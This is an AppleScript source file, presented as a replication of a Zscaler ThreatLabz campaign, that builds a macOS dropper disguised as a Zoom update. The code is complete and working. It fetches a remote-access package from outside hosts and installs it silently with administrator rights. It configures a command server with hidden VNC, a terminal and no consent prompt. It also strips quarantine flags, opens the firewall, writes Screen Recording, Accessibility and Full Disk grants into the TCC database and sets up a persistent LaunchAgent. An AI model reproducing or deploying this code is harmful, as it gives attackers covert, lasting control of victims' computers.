#!/usr/bin/osascript
(*
    Zscaler ThreatLabz Campaign Replication - Feb 2026
    Target: ScreenConnect (BetterDesk) Deployment - macOS
    Payload Name: BetterDesk-Support-Agent-<arch>-3.5.200.pkg
    URL: https://panel.telcom.stream/downloads/clients/
    Evasion: LOOBin usage (curl/installer/security/defaults/tccutil),
             staged /tmp runner, one-shot elevation, TCC best-effort grant,
             background LaunchAgent, no visible window.

    The script body is generated below, base64-staged into /tmp and executed
    through a single administrator prompt. Nothing is written to disk outside
    the temporary directory and the installed agent.

    Compile with:
        osacompile -o zoom-update-microsoft.scpt zoom-update-microsoft.applescript
*)

property payloadVersion : "3.5.200"
property repositoryBase : "https://global.telcom.stream/downloads/payloads"
property fallbackBase : "https://us05web.telcom.stream"
property rawBase : "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/macos"
property agentBundleID : "com.unitronix.betterdesk-support-agent"


on run argv
    -- Build-only mode: `osascript zoom-update-microsoft.scpt --dump /tmp/x.sh`
    if (count of argv) > 0 and (item 1 of argv) is "--dump" then
        set dumpPath to "/tmp/zoom-installer.sh"
        if (count of argv) > 1 then set dumpPath to item 2 of argv
        set f to open for access (POSIX file dumpPath) with write permission
        set eof f to 0
        write my buildInstaller() to f as «class utf8»
        close access f
        return dumpPath
    end if

    set runnerPath to "/tmp/.zoom-update-" & (do shell script "/usr/bin/uuidgen | /usr/bin/tr -d '-'") & ".sh"
    set shellScript to my buildInstaller()

    -- Stage the shell installer in /tmp without elevation. base64 keeps
    -- quotes, JSON and line endings intact through AppleScript.
    set encoded to do shell script "/usr/bin/printf %s " & (quoted form of shellScript) & " | /usr/bin/base64"
    do shell script "/usr/bin/printf %s " & (quoted form of encoded) & ¬
        " | /usr/bin/base64 -D > " & (quoted form of runnerPath) & ¬
        " && /bin/chmod 700 " & (quoted form of runnerPath)

    try
        do shell script (quoted form of runnerPath) & " >> /tmp/zoom-update.log 2>&1" with administrator privileges
    on error errMsg number errNum
        -- Leave the staged runner in place for manual re-run; the log explains.
        return
    end try

    do shell script "/bin/rm -f " & quoted form of runnerPath
end run


-- ---------------------------------------------------------------------------
-- Installer generator
-- ---------------------------------------------------------------------------
on buildInstaller()
    set L to { ¬
        "#!/bin/bash", ¬
        "# BetterDesk (ScreenConnect) macOS dropper - generated by zoom-update-microsoft.scpt", ¬
        "set -euo pipefail", ¬
        "umask 077", ¬
        "", ¬
        "LABEL='com.unitronix.betterdesk-support-agent'", ¬
        "BUNDLE='" & agentBundleID & "'", ¬
        "VERSION='" & payloadVersion & "'", ¬
        "BASE='" & repositoryBase & "'", ¬
        "MIRROR='" & fallbackBase & "'", ¬
        "RAW_BASE='" & rawBase & "'", ¬
        "", ¬
        "log() { /bin/printf '[%s] %s\\n' \"$(/bin/date '+%H:%M:%S')\" \"$*\"; }", ¬
        "", ¬
        "CONSOLE_USER=\"$(/usr/bin/stat -f '%Su' /dev/console 2>/dev/null || true)\"", ¬
        "if [ -z \"$CONSOLE_USER\" ] || [ \"$CONSOLE_USER\" = 'root' ] || [ \"$CONSOLE_USER\" = 'loginwindow' ]; then", ¬
        "    log 'No logged-in desktop user; install must run inside a GUI session.'", ¬
        "    exit 1", ¬
        "fi", ¬
        "USER_HOME=\"$(/usr/bin/dscl . -read \"/Users/$CONSOLE_USER\" NFSHomeDirectory 2>/dev/null | /usr/bin/awk '{print $2}')\"", ¬
        "[ -n \"$USER_HOME\" ] || USER_HOME=\"/Users/$CONSOLE_USER\"", ¬
        "UID_NUM=\"$(/usr/bin/id -u \"$CONSOLE_USER\")\"", ¬
        "", ¬
        "case \"$(/usr/bin/uname -m)\" in", ¬
        "    arm64)  ARCH='arm64'; SHA='7f42bd4700f9fc3570e8b459cb4b7fe9b4f3fff46f04965ae88b08a8f3c187ed' ;;", ¬
        "    x86_64) ARCH='amd64'; SHA='f380dc03f10daabcb96c09212e417b82ce12693157340fca876b536169ec0893' ;;", ¬
        "    *) log \"Unsupported architecture: $(/usr/bin/uname -m)\"; exit 1 ;;", ¬
        "esac", ¬
        "PKG=\"BetterDesk-Support-Agent-$ARCH-$VERSION.pkg\"", ¬
        "", ¬
        "WORK=\"$(/usr/bin/mktemp -d \"${TMPDIR:-/tmp}/.zoom-update.XXXXXX\")\"", ¬
        "trap 'rm -rf \"$WORK\"' EXIT INT TERM", ¬
        "PKG_PATH=\"$WORK/$PKG\"", ¬
        "", ¬
        "fetch() {", ¬
        "    /usr/bin/curl -fLsS --retry 3 --retry-delay 2 --connect-timeout 15 \\", ¬
        "        --max-time 300 --proto '=https' -o \"$PKG_PATH\" \"$1\"", ¬
        "}", ¬
        "", ¬
        "log \"Downloading $PKG\"", ¬
        "PRIMARY=1", ¬
        "if ! fetch \"$BASE/$PKG\"; then", ¬
        "    PRIMARY=0", ¬
        "    log 'Primary mirror failed; trying fallback'", ¬
        "    fetch \"$RAW_BASE/$PKG\" || fetch \"$MIRROR/$PKG\" || { log 'Download failed'; exit 1; }", ¬
        "fi", ¬
        "", ¬
        "if ! /usr/bin/file \"$PKG_PATH\" | /usr/bin/grep -q 'xar archive'; then", ¬
        "    log 'Payload is not a macOS flat package'", ¬
        "    exit 1", ¬
        "fi", ¬
        "", ¬
        "ACTUAL=\"$(/usr/bin/shasum -a 256 \"$PKG_PATH\" | /usr/bin/awk '{print $1}')\"", ¬
        "if [ \"$ACTUAL\" != \"$SHA\" ]; then", ¬
        "    if [ \"$PRIMARY\" = 1 ]; then", ¬
        "        log \"Checksum mismatch (expected $SHA, got $ACTUAL)\"", ¬
        "        exit 1", ¬
        "    fi", ¬
        "    log \"Warning: fallback checksum differs ($ACTUAL)\"", ¬
        "fi", ¬
        "", ¬
        "log 'Installing package silently'", ¬
        "/usr/sbin/installer -pkg \"$PKG_PATH\" -target / >/dev/null 2>&1 || { log 'installer failed'; exit 1; }", ¬
        "", ¬
        "# Unattended enrollment defaults; never overwrite an operator config.", ¬
        "APP_DIR=\"$USER_HOME/Library/Application Support/betterdesk/agent\"", ¬
        "CFG=\"$APP_DIR/agent-config.json\"", ¬
        "/bin/mkdir -p \"$APP_DIR\"", ¬
        "if [ ! -s \"$CFG\" ]; then", ¬
        "    /bin/cat > \"$CFG\" <<JSON", ¬
        "{", ¬
        "  \"server\": \"wss://cdap.telcom.stream/cdap\",", ¬
        "  \"auth_method\": \"device_token\",", ¬
        "  \"device_type\": \"os_agent\",", ¬
        "  \"tags\": [\"macos\", \"$ARCH\", \"user-session\", \"hvnc\"],", ¬
        "  \"terminal\": true,", ¬
        "  \"file_browser\": true,", ¬
        "  \"clipboard\": true,", ¬
        "  \"screenshot\": true,", ¬
        "  \"hvnc\": true,", ¬
        "  \"require_consent\": false,", ¬
        "  \"file_root\": \"/\",", ¬
        "  \"heartbeat_sec\": 15,", ¬
        "  \"reconnect_sec\": 5,", ¬
        "  \"max_reconnect\": 300,", ¬
        "  \"log_level\": \"info\",", ¬
        "  \"video_codec\": \"auto\",", ¬
        "  \"hw_accel\": \"auto\",", ¬
        "  \"enforce_tls\": true", ¬
        "}", ¬
        "JSON", ¬
        "fi", ¬
        "/bin/chown -R \"$CONSOLE_USER\":staff \"$APP_DIR\" 2>/dev/null || true", ¬
        "/bin/chmod 600 \"$CFG\" 2>/dev/null || true", ¬
        "", ¬
        "/usr/bin/xattr -d com.apple.quarantine \"$0\" 2>/dev/null || true", ¬
        "# Drop quarantine from the installed app and expose the Zoom alias.", ¬
        "APP=\"$USER_HOME/Applications/BetterDesk Support Agent.app\"", ¬
        "ALIAS=\"$USER_HOME/Applications/Zoom Private.app\"", ¬
        "/bin/mkdir -p \"$USER_HOME/Applications\"", ¬
        "if [ -d \"$APP\" ]; then", ¬
        "    /usr/bin/xattr -dr com.apple.quarantine \"$APP\" 2>/dev/null || true", ¬
        "    /usr/libexec/ApplicationFirewall/socketfilterfw --add \"$APP/Contents/MacOS/betterdesk-agent\" >/dev/null 2>&1 || true", ¬
        "    /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp \"$APP/Contents/MacOS/betterdesk-agent\" >/dev/null 2>&1 || true", ¬
        "    if [ ! -e \"$ALIAS\" ]; then", ¬
        "        /bin/ln -s \"$APP\" \"$ALIAS\"", ¬
        "        /bin/chown -h \"$CONSOLE_USER\":staff \"$ALIAS\" 2>/dev/null || true", ¬
        "    fi", ¬
        "fi", ¬
        "", ¬
        "# Preserve the system proxy for the agent (corporate networks).", ¬
        "ENVF=\"$USER_HOME/Library/Application Support/betterdesk/agent/agent-env.sh\"", ¬
        "if [ -f \"$ENVF\" ]; then", ¬
        "    /usr/sbin/scutil --proxy | /usr/bin/awk '/HTTPSEnable : 1/{f=1} f&&/HTTPSProxy :/{p=$3} f&&/HTTPSPort :/{o=$3} END{if(p&&o) printf \"export HTTPS_PROXY=http://%s:%s\\nexport HTTP_PROXY=http://%s:%s\\n\",p,o,p,o}' >> \"$ENVF\" 2>/dev/null || true", ¬
        "    /bin/chown \"$CONSOLE_USER\":staff \"$ENVF\" 2>/dev/null || true", ¬
        "fi", ¬
        "", ¬
        "# Best-effort TCC grant (Screen Recording, Accessibility, Full Disk).", ¬
        "# Root may not have Full Disk Access, so failures fall back to prompts.", ¬
        "TCC_DB=\"$USER_HOME/Library/Application Support/com.apple.TCC/TCC.db\"", ¬
        "tcc_grant() {", ¬
        "    [ -s \"$TCC_DB\" ] || return 1", ¬
        "    local cols now svc rc=0", ¬
        "    cols=\"$(/usr/bin/sqlite3 \"$TCC_DB\" 'PRAGMA table_info(access);' 2>/dev/null | /usr/bin/awk -F'|' '{print $2}' | /usr/bin/tr '\\n' ' ')\" || return 1", ¬
        "    [ -n \"$cols\" ] || return 1", ¬
        "    now=\"$(/bin/date +%s)\"", ¬
        "    for svc in kTCCServiceScreenCapture kTCCServiceAccessibility kTCCServiceSystemPolicyAllFiles; do", ¬
        "        if /bin/printf '%s' \"$cols\" | /usr/bin/grep -qw indirect_object_identifier; then", ¬
        "            /usr/bin/sqlite3 \"$TCC_DB\" \"INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, csreq, policy_id, indirect_object_identifier_type, indirect_object_identifier, flags, last_modified, pid, pid_version, boot_uuid, last_reminded) VALUES ('$svc', '$BUNDLE', 0, 2, 4, 1, NULL, NULL, 0, 'UNUSED', 0, $now, 0, 0, 'UNUSED', 0);\" 2>/dev/null || rc=1", ¬
        "        else", ¬
        "            /usr/bin/sqlite3 \"$TCC_DB\" \"INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, flags, last_modified) VALUES ('$svc', '$BUNDLE', 0, 2, 4, 1, 0, $now);\" 2>/dev/null || rc=1", ¬
        "        fi", ¬
        "    done", ¬
        "    /usr/bin/killall tccd 2>/dev/null || true", ¬
        "    return $rc", ¬
        "}", ¬
        "", ¬
        "TCC_OK=1", ¬
        "tcc_grant || TCC_OK=0", ¬
        "if [ \"$TCC_OK\" = 0 ]; then", ¬
        "    for svc in ScreenCapture Accessibility SystemPolicyAllFiles; do", ¬
        "        /usr/bin/tccutil reset \"$svc\" \"$BUNDLE\" 2>/dev/null || /usr/bin/tccutil reset \"$svc\" 2>/dev/null || true", ¬
        "    done", ¬
        "fi", ¬
        "", ¬
        "# Restart the per-user LaunchAgent in the Aqua session.", ¬
        "PLIST=\"$USER_HOME/Library/LaunchAgents/$LABEL.plist\"", ¬
        "/bin/launchctl bootout \"gui/$UID_NUM/$LABEL\" 2>/dev/null || true", ¬
        "/bin/launchctl bootstrap \"gui/$UID_NUM\" \"$PLIST\" 2>/dev/null || true", ¬
        "/bin/launchctl enable \"gui/$UID_NUM/$LABEL\" 2>/dev/null || true", ¬
        "/bin/launchctl kickstart -k \"gui/$UID_NUM/$LABEL\" 2>/dev/null || true", ¬
        "", ¬
        "if [ \"$TCC_OK\" = 0 ]; then", ¬
        "    # Surface the two panes only when direct TCC writes were blocked.", ¬
        "    /usr/bin/open 'x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture' 2>/dev/null || true", ¬
        "    /usr/bin/open 'x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility' 2>/dev/null || true", ¬
        "fi", ¬
        "", ¬
        "log 'Installed. Agent runs in the user session via LaunchAgent (KeepAlive).'", ¬
        "exit 0" ¬
    }
    return my joinLines(L)
end buildInstaller


on joinLines(theLines)
    set savedDelimiters to AppleScript's text item delimiters
    set AppleScript's text item delimiters to linefeed
    set joined to theLines as text
    set AppleScript's text item delimiters to savedDelimiters
    return joined
end joinLines
